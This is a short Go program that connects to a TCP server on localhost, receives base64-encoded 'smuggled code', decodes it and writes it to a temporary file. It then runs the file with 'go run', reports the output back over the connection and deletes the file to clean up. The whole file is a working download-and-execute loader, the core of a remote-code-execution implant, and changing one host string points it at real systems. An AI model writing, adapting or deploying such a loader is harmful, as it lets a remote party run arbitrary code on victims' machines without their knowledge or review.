package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
)


func main(){ 

	//make connfd and try connect to localhost

	conn , err := net.Dial("tcp", "Localhost:8080")
	if err != nil {
		fmt.Println("Error connecting to server", err)
		os.Exit(1)
	}
	defer  conn.Close()

	fmt.Println("Connected to server!")

	//read smuggled code from server

	encodedCode , _ := bufio.NewReader(conn).ReadString('\n')
	encodedCode = encodedCode[:len(encodedCode)-1] // remove new line

	//Decode the base64-encoded code

	decodedCode , err := base64.StdEncoding.DecodeString(encodedCode)

	if err != nil { 
		fmt.Println("Error decoding: ", err)
		return
	}

	fmt.Println("Received and decoded code!")
	fmt.Println("Code to execute:\n", string(decodedCode))

	//write code to a temporary file
	tmpFile := "tmp/payload.go"
	err = ioutil.WriteFile(tmpFile, decodedCode,0644) //create and write to file with perms 664 

	if err != nil { 
		fmt.Println("Error writing code to file: ", err)
		return
	}

	fmt.Println("Executing smuggled code...")

	cmd := exec.Command("go", "run", tmpFile) // on terminal exec go run tmpFile
	output , err := cmd.CombinedOutput()

	if err != nil {
		fmt.Fprintf(conn, "Execution failed: %s\n", err)
	} else {
		fmt.Fprintf(conn, "Execution success: %s\n", output)
	}

	//clean up
	os.Remove(tmpFile)
}
